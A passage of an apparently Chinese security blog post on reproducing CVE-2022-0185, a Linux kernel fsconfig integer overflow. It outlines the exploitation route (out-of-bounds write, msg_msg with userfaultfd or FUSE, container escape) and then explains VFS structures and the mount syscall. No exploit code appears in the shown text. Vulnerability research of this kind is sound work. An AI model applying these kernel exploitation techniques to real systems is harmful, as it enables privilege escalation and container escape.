

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="peiwithhao">
  <meta name="keywords" content="">
  
    <meta name="description" content="九山八海、为一世界，聚千界则成“小千世界”，此界乘三，无我不断者，三刀流奥义·一大‧三千‧大千‧世界！">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-0185漏洞复现">
<meta property="og:url" content="https://peiandhao.github.io/2023/10/10/CVE-2022-0185/index.html">
<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
<meta property="og:description" content="九山八海、为一世界，聚千界则成“小千世界”，此界乘三，无我不断者，三刀流奥义·一大‧三千‧大千‧世界！">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://peiandhao.github.io/img/CVE-2022-0185.jpg">
<meta property="article:published_time" content="2023-10-10T11:10:31.000Z">
<meta property="article:modified_time" content="2023-10-10T11:21:12.036Z">
<meta property="article:author" content="peiwithhao">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Kernel">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://peiandhao.github.io/img/CVE-2022-0185.jpg">
  
  
  
  <title>CVE-2022-0185漏洞复现 - peiwithhao&#39;s Valhalla</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>p3ivv1+h@0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/CVE-2022-0185.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2022-0185漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        peiwithhao
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-10 19:10" pubdate>
          2023年10月10日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          75k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          622 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CVE-2022-0185漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2022-0185"><a href="#CVE-2022-0185" class="headerlink" title="CVE-2022-0185"></a>CVE-2022-0185</h1><p>算是第一次进行Linux的漏洞分析，其中还是有许多不足，复现还有几种手法没实现完全</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16e4308055b5deb48f8c54640a.jpg" srcset="/img/loading.gif" lazyload></p>
<h1 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h1><p><img src="http://imgsrc.baidu.com/forum/pic/item/9f2f070828381f304cb1979def014c086e06f05e.jpg" srcset="/img/loading.gif" lazyload></p>
<p>由<a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html">BitsByWill</a>大师提出，以此赢得了31337刀的奖金(但看评论好像本来是50K，最后起了点矛盾降价惹)以及成功在google kctf中实现容器逃逸</p>
<p>整个漏洞利用了VFS中 <code>fsconfig</code>某个参数实现的函数过程当中的一个整形溢出来实现越界写，其中利用手法也是十分精彩，原作者博客是利用到他曾经在 corctf2021上出的一道 <a target="_blank" rel="noopener" href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html"><code>fire of selvation</code></a>，此外作者好朋友D3V17也在当年出了同样一道题目，但是难度会在前面的题更大，<a target="_blank" rel="noopener" href="https://syst3mfailure.io/wall-of-perdition/"><code>wall of perdition</code></a>,其中便是使用 <code>msg_msg</code>搭配 <code>userfaultfd</code>来实现任意写或者读，而为了应用到本次漏洞，考虑到高版本userfaultfd无法为普通用户使用，所以让 <code>FUSE</code>来代替 <code>userfaultfd</code>，一般前者不会在CTF赛事当中出现，他需要在有着完备的环境条件才可使用，就比如说真机，而 <code>BitesByWill</code>师傅也顺便写了一个简单的fuse库来辅助利用orz</p>
<h1 id="二、文件系统基础知识"><a href="#二、文件系统基础知识" class="headerlink" title="二、文件系统基础知识"></a>二、文件系统基础知识</h1><h2 id="1-VFS基本概念"><a href="#1-VFS基本概念" class="headerlink" title="1.VFS基本概念"></a>1.VFS基本概念</h2><p>早就听说过虚拟文件系统的大名，网上的解释如下：</p>
<blockquote>
<p>VFS（Virtual Filesystem Switch）称为虚拟文件系统或虚拟文件系统转换，是一个内核软件层，在具体的文件系统之上抽象的一层，用来处理与Posix文件系统相关的所有调用，表现为能够给各种文件系统提供一个通用的接口，使上层的应用程序能够使用通用的接口访问不同文件系统，同时也为不同文件系统的通信提供了媒介</p>
</blockquote>
<p>从概念上来看其实十分的简单易懂,也就是类似开发中的面向接口编程了,他为不同的文件系统定义了一个普遍的接口,所以不同文件系统只需要按照这个规定好的接口来构造即可,具体实现部分可以按照自己的思路来</p>
<p>在我们的oS当中,整体布局可以用下面这个图来表示,CSDN找的,侵删.不得不说这个图画的十分的好,我就自己不献丑了</p>
<p><img src="https://img-blog.csdn.net/20180318233241252?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L3UwMTA0ODc1Njg=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" srcset="/img/loading.gif" lazyload></p>
<p>平常我们所使用的系统调用也是第一先经过VFS,通过他提供的接口来进行系统调用的操作,当然具体实现还是看底层真正存在的文件系统类型了,但是在用户层程序员的眼中看来并无太大区别,由于不同文件系统的多样性和用户系统调用的复杂性,VFS文件系统这一抽象层的存在是十分具有存在意义的.</p>
<h2 id="2-VFS抽象接口"><a href="#2-VFS抽象接口" class="headerlink" title="2.VFS抽象接口"></a>2.VFS抽象接口</h2><p>上述示例中提到VFS也有自己的文件模型，用来支持操作系统的系统调用。下面是VFS抽象模型支持的所有Linux系统调用：</p>
<ul>
<li>文件系统相关：mount, umount, umount2, sysfs,  statfs,  fstatfs,  fstatfs64, ustat</li>
<li>目录相关：chroot，pivot_root，chdir，fchdir，getcwd，mkdir，rmdir，getdents，getdents64，readdir，link，unlink，rename，lookup_dcookie</li>
<li>链接相关：readlink，symlink</li>
<li>文件相关：chown， fchown，lchown，chown16，fchown16，lchown16，hmod，fchmod，utime，stat，fstat，lstat，acess，oldstat，oldfstat，oldlstat，stat64，lstat64，lstat64，open，close，creat，umask，dup，dup2，fcntl， fcntl64，select，poll，truncate，ftruncate，truncate64，ftruncate64，lseek，llseek，read，write，readv，writev，sendfile，sendfile64，readahead</li>
</ul>
<h2 id="3-VFS-Common-File-Model"><a href="#3-VFS-Common-File-Model" class="headerlink" title="3.VFS Common File Model"></a>3.VFS Common File Model</h2><p>就是说文件系统的抽象化模型,在我们硬盘之中,扇区普遍设置为512字节,而我们内存与硬盘的交互是十分缓慢的,所以一般数据交换并不以扇区(sectors)为单位,而是以块(block)为单位,块一般为4KB大小</p>
<p>硬盘中文件系统就是用来存放文件信息的,其中不仅有文件类容,还需要存放一些关于文件的信息,例如说文件归属,文件权限等,因此在文件系统中会存放inode节点,在之前自己实现的OS当中是存放了文件数据的扇区号等等用来方便访问.我们最初的open系统调用实际上就是将inode节点从硬盘转到内存了而已.</p>
<p>文件系统中定义了四个较为重要的对象,他们合在一起便构建了我们的统一文件模型,接下来分别介绍他们</p>
<h3 id="1-Superblock"><a href="#1-Superblock" class="headerlink" title="1.Superblock"></a>1.Superblock</h3><p>超级块,Unix的特色,里面存放了一系列我们需要使用的元信息,相当于是一个统筹全局的资料库</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/d058ccbf6c81800a8f226cc8f43533fa838b4735.jpg" srcset="/img/loading.gif" lazyload></p>
<p>他的数据结构体被存放于<code>include/linux/fs.h</code>中,大家有兴趣可以详细查看</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">super_block</span> &#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span>	s_list;		<span class="hljs-comment">/* Keep this first */</span> 		<span class="hljs-comment">//链接各超级块</span><br>	<span class="hljs-type">dev_t</span>			s_dev;		<span class="hljs-comment">/* search index; _not_ kdev_t */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>		s_blocksize_bits;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		s_blocksize;<br>	<span class="hljs-type">loff_t</span>			s_maxbytes;	<span class="hljs-comment">/* Max file size */</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span>	*s_type;<br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">super_operations</span>	*s_op; 				<span class="hljs-comment">//操作文件系统的函数指针</span><br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dquot_operations</span>	*dq_op;<br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">quotactl_ops</span>	*s_qcop;<br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">export_operations</span> *s_export_op;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		s_flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		s_iflags;	<span class="hljs-comment">/* internal SB_I_* flags */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		s_magic;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span>		*s_root; 				<span class="hljs-comment">//根目录入口点</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">rw_semaphore</span>	s_umount;<br>	<span class="hljs-type">int</span>			s_count;<br>	<span class="hljs-type">atomic_t</span>		s_active;<br>	<br>	...<br>	<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>一般我们的超级块都会存放在该文件系统的头部,由于linux一般可以挂在多个文件系统,所以这个超级块的<code>s_list</code>字段就是用来链接下一个超级快</p>
<h3 id="2-inode"><a href="#2-inode" class="headerlink" title="2.inode"></a>2.inode</h3><p>他标识了一个存在于硬盘中的文件，他在内存当中是以VFS inode存在，在硬盘中则可能有些许不同，可能包含了存放在硬盘中不需要的一些字段，可能有某种不以inode进行管理的文件系统，<del>说的就是你们，FAT和Reiserfs</del>，VFS的处理方式就是将其中的特定信息赋值给内存中的inode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Keep mostly read-only and often accessed (especially for</span><br><span class="hljs-comment"> * the RCU path lookup and &#x27;stat&#x27; data) fields at the beginning</span><br><span class="hljs-comment"> * of the &#x27;struct inode&#x27;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> &#123;<br>	<span class="hljs-type">umode_t</span>			i_mode;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>		i_opflags;<br>	<span class="hljs-type">kuid_t</span>			i_uid;<br>	<span class="hljs-type">kgid_t</span>			i_gid;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>		i_flags;<br>	<br>	...<br><br>&#125; __randomize_layout;<br><br></code></pre></td></tr></table></figure>

<h3 id="3-dentry"><a href="#3-dentry" class="headerlink" title="3.dentry"></a>3.dentry</h3><p>目录项缓存，Linux使用它来快速访问此前的查找操作的结果。在VFS连同文件系统实现读取的一个目录项（目录或文件）的数据之后，则创建一个dentry实例，以缓存找到的数据，这样下次我们寻找该文件&#x2F;目录则会首先从该缓存找起，而不是再次通过文件名来到查找相应目录项了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> &#123;<br>	<span class="hljs-comment">/* RCU lookup touched fields */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> d_flags;		<span class="hljs-comment">/* protected by d_lock */</span><br>	<span class="hljs-type">seqcount_spinlock_t</span> d_seq;	<span class="hljs-comment">/* per dentry seqlock */</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_bl_node</span> d_hash;	<span class="hljs-comment">/* lookup hash list */</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> *d_parent;	<span class="hljs-comment">/* 父目录 */</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">qstr</span> d_name;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> *d_inode;		<span class="hljs-comment">/* 该文件名所属inode，如果不存在则为NULL */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> d_iname[DNAME_INLINE_LEN];	<span class="hljs-comment">/* small names */</span><br><br>	<span class="hljs-comment">/* Ref lookup also touches following */</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lockref</span> d_lockref;	<span class="hljs-comment">/* per-dentry lock and refcount */</span><br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry_operations</span> *d_op;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">super_block</span> *d_sb;	<span class="hljs-comment">/* The root of the dentry tree */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> d_time;		<span class="hljs-comment">/* used by d_revalidate */</span><br>	<span class="hljs-type">void</span> *d_fsdata;			<span class="hljs-comment">/* fs-specific data */</span><br><br>	<span class="hljs-keyword">union</span> &#123;<br>		<span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> d_lru;		<span class="hljs-comment">/* LRU list */</span><br>		<span class="hljs-type">wait_queue_head_t</span> *d_wait;	<span class="hljs-comment">/* in-lookup ones only */</span><br>	&#125;;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> d_child;	<span class="hljs-comment">/* child of parent list */</span><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> d_subdirs;	<span class="hljs-comment">/* our children */</span><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * d_alias and d_rcu can share memory</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">union</span> &#123;<br>		<span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> d_alias;	<span class="hljs-comment">/* inode alias list */</span><br>		<span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_bl_node</span> d_in_lookup_hash;	<span class="hljs-comment">/* only for in-lookup ones */</span><br>	 	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">rcu_head</span> d_rcu;<br>	&#125; d_u;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>



<h2 id="4-传统mount系统调用"><a href="#4-传统mount系统调用" class="headerlink" title="4.传统mount系统调用"></a>4.传统mount系统调用</h2><p>我们平时都会使用mount系统调用来挂在某一文件系统，我们可以查看一下Linux手册</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">SYNOPSIS<br>       mount <span class="hljs-comment">[-h|-V]</span><br><br>       mount <span class="hljs-comment">[-l]</span> <span class="hljs-comment">[-t fstype]</span><br><br>       mount -a <span class="hljs-comment">[-fFnrsvw]</span> <span class="hljs-comment">[-t fstype]</span> <span class="hljs-comment">[-O optlist]</span><br><br>       mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-o options]</span> device|mountpoint<br><br>       mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-t fstype]</span> <span class="hljs-comment">[-o options]</span> device mountpoint<br><br>       mount --bind|--rbind|--move olddir newdir<br><br>       mount --make-<span class="hljs-comment">[shared|slave|private|unbindable|rshared|rslave|rprivate|runbindable]</span> mountpoint<br><br></code></pre></td></tr></table></figure>

<p>我们通常会采用下面命令来进行挂载</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mount -t xfs <span class="hljs-regexp">/dev/</span>sdb1 -o <span class="hljs-regexp">/mnt/</span>temp<br></code></pre></td></tr></table></figure>

<p>具体含义就是将&#x2F;dev&#x2F;sdb1设备代表的文件系统以xfs文件系统的格式来挂载到&#x2F;mnt&#x2F;temp目录下，这样就加入到了我们<code>/</code>根目录的文件树当中，这样以来我们才可以正常访问其中内容，除了Linux实际上windows也存在挂载操作，但为了简化我们用户的使用就隐藏了这一点</p>
<p>除了命令行使用的mount，我们来关注一下代码当中使用的mount系统调用，以下查看手册</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">man</span> <span class="hljs-number">2</span> <span class="hljs-built_in">mount</span><br></code></pre></td></tr></table></figure>

<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs tcl">mount(<span class="hljs-number">2</span>)                                                                                              System Calls Manual                                                                                              mount(<span class="hljs-number">2</span>)<br><br>NAME<br>       mount - mount filesystem<br><br>LIBRARY<br>       Standard C library (libc, -lc)<br><br>SYNOPSIS<br><span class="hljs-comment">       #include &lt;sys/mount.h&gt;</span><br><br>       int mount(const char *<span class="hljs-keyword">source</span>, const char *target,<br>                 const char *filesystemtype, unsigned long mountflags,<br>                 const void *_Nullable data);<br><br>DESCRIPTION<br>       mount() 将源指定的文件系统（通常是引用设备的路径名，但也可以是目录或文件的路径名，或虚拟字符串）附加到路径名指定的位置（目录或文件） 在目标中。<br><br>       挂载文件系统需要适当的权限（Linux：CAP_SYS_ADMIN 功能）。<br><br>       Values <span class="hljs-keyword">for</span> the filesystemtype argument supported by the kernel are listed in /<span class="hljs-keyword">proc</span>/filesystems (e.g., &quot;btrfs&quot;, &quot;ext4&quot;, &quot;jfs&quot;, &quot;xfs&quot;, &quot;vfat&quot;, &quot;fuse&quot;, &quot;tmpfs&quot;, &quot;cgroup&quot;, &quot;<span class="hljs-keyword">proc</span>&quot;,  &quot;mqueue&quot;,  &quot;nfs&quot;,  &quot;cifs&quot;,  &quot;iso9660&quot;).<span class="hljs-title"></span><br><span class="hljs-title">       Further</span> types<span class="hljs-title"> may</span> become<span class="hljs-title"> available</span> when<span class="hljs-title"> the</span> appropriate<span class="hljs-title"> modules</span> are<span class="hljs-title"> loaded.</span><br><br>       数据参数由不同的文件系统解释。 通常，它是该文件系统可以理解的一串以逗号分隔的选项。 有关每种文件系统类型可用选项的详细信息，请参阅<span class="hljs-title"> mount(8)。</span> 如果没有选项，则可以将该参数指定为<span class="hljs-title"> NULL。</span><br><span class="hljs-title"></span><br><span class="hljs-title">       A</span> call<span class="hljs-title"> to</span> mount()<span class="hljs-title"> performs</span> one<span class="hljs-title"> of</span> a<span class="hljs-title"> number</span> of<span class="hljs-title"> general</span> types<span class="hljs-title"> of</span> operation,<span class="hljs-title"> depending</span> on<span class="hljs-title"> the</span> bits<span class="hljs-title"> specified</span> in<span class="hljs-title"> mountflags.</span> <span class="hljs-title"> The</span> choice<span class="hljs-title"> of</span> which<span class="hljs-title"> operation</span> to<span class="hljs-title"> perform</span> is<span class="hljs-title"> determined</span> by<span class="hljs-title"> testing</span> the<span class="hljs-title"> bits</span> set<span class="hljs-title"> in</span> <span class="hljs-title"> mountflags,</span><br><span class="hljs-title">       with</span> the<span class="hljs-title"> tests</span> being<span class="hljs-title"> conducted</span> in<span class="hljs-title"> the</span> order<span class="hljs-title"> listed</span> here:<br><br>       •<span class="hljs-title">  Remount</span> an<span class="hljs-title"> existing</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> MS_REMOUNT.</span><br><br>       •<span class="hljs-title">  Create</span> a<span class="hljs-title"> bind</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> MS_BIND.</span><br><br>       •<span class="hljs-title">  Change</span> the<span class="hljs-title"> propagation</span> type<span class="hljs-title"> of</span> an<span class="hljs-title"> existing</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> one</span> of<span class="hljs-title"> MS_SHARED,</span> MS_PRIVATE,<span class="hljs-title"> MS_SLAVE,</span> or<span class="hljs-title"> MS_UNBINDABLE.</span><br><br>       •<span class="hljs-title">  Move</span> an<span class="hljs-title"> existing</span> mount<span class="hljs-title"> to</span> a<span class="hljs-title"> new</span> location:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> MS_MOVE.</span><br><br>       •<span class="hljs-title">  Create</span> a<span class="hljs-title"> new</span> mount:<span class="hljs-title"> mountflags</span> includes<span class="hljs-title"> none</span> of<span class="hljs-title"> the</span> above<span class="hljs-title"> flags.</span><br><span class="hljs-title"></span><br><span class="hljs-title">       Each</span> of<span class="hljs-title"> these</span> operations<span class="hljs-title"> is</span> detailed<span class="hljs-title"> later</span> in<span class="hljs-title"> this</span> page.<span class="hljs-title">  Further</span> flags<span class="hljs-title"> may</span> be<span class="hljs-title"> specified</span> in<span class="hljs-title"> mountflags</span> to<span class="hljs-title"> modify</span> the<span class="hljs-title"> behavior</span> of<span class="hljs-title"> mount(),</span> as<span class="hljs-title"> described</span> below.<br><br></code></pre></td></tr></table></figure>



